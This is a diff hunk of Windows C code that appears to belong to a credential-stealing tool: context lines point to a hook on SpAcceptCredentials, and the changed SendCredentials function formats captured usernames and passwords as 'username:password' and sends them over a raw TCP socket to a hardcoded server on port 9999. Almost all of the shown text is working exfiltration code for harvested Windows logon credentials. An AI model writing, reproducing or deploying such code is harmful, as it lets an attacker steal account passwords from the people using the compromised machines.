@@ -87,71 +87,50 @@ PVOID GetPatternMemoryAddress(char *startAddress, char *pattern, SIZE_T patternS
 // Simple TCP client - sends credentials like: "username:password"
 BOOL SendCredentials(const wchar_t* username, const wchar_t* password)
 {
-	SOCKET sock = INVALID_SOCKET;
-	struct addrinfo *result = NULL, hints;
-	int iResult;
-	
-	// Server config - change these
-	const char* SERVER_IP = "10.0.0.71";  // Your server IP
-	const char* SERVER_PORT = "9999";         // Your server port
-	
-	// Initialize Winsock
-	WSADATA wsaData;
-	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
-	if (iResult != 0) {
-		return FALSE;
-	}
-	
-	ZeroMemory(&hints, sizeof(hints));
-	hints.ai_family = AF_UNSPEC;
-	hints.ai_socktype = SOCK_STREAM;
-	hints.ai_protocol = IPPROTO_TCP;
-	
-	// Resolve server address
-	iResult = getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &result);
-	if (iResult != 0) {
-		WSACleanup();
-		return FALSE;
-	}
-	
-	// Create socket
-	sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
-	if (sock == INVALID_SOCKET) {
-		freeaddrinfo(result);
-		WSACleanup();
-		return FALSE;
-	}
-	
-	// Connect to server
-	iResult = connect(sock, result->ai_addr, (int)result->ai_addrlen);
-	if (iResult == SOCKET_ERROR) {
-		closesocket(sock);
-		freeaddrinfo(result);
-		WSACleanup();
-		return FALSE;
-	}
-	
-	freeaddrinfo(result);
+	WSADATA wsa;
+	SOCKET s;
+	struct sockaddr_in server;
 	
 	// Convert Unicode to ASCII for transmission
 	char username_ascii[256] = {0};
 	char password_ascii[256] = {0};
-	
 	WideCharToMultiByte(CP_UTF8, 0, username, -1, username_ascii, 256, NULL, NULL);
 	WideCharToMultiByte(CP_UTF8, 0, password, -1, password_ascii, 256, NULL, NULL);
 	
-	// Format like: "username:password"
-	char credential_data[512];
-	sprintf_s(credential_data, sizeof(credential_data), "%s:%s", username_ascii, password_ascii);
+	// Format exactly like the Linux version: "username:password"
+	char msg[512];
+	sprintf_s(msg, sizeof(msg), "%s:%s", username_ascii, password_ascii);
 	
-	// Send data
-	iResult = send(sock, credential_data, strlen(credential_data), 0);
+	// Initialize Winsock
+	if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
+		return FALSE;
+	}
+	
+	// Create socket
+	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (s == INVALID_SOCKET) {
+		WSACleanup();
+		return FALSE;
+	}
+	
+	const char* server_ip = "10.0.0.80";
+	int server_port = 9999;
+
+	// Set up server address
+	server.sin_family = AF_INET;
+	server.sin_port = htons(server_port);
+	inet_pton(AF_INET, server_ip, &server.sin_addr);
+	
+	// Connect and send (exactly like nc does)
+	if (connect(s, (struct sockaddr*)&server, sizeof(server)) == 0) {
+		send(s, msg, (int)strlen(msg), 0);
+	}
 	
 	// Cleanup
-	closesocket(sock);
+	closesocket(s);
 	WSACleanup();
 	
-	return (iResult != SOCKET_ERROR);
+	return TRUE;
 }
 
 // Hook function that intercepts SpAcceptCredentials calls
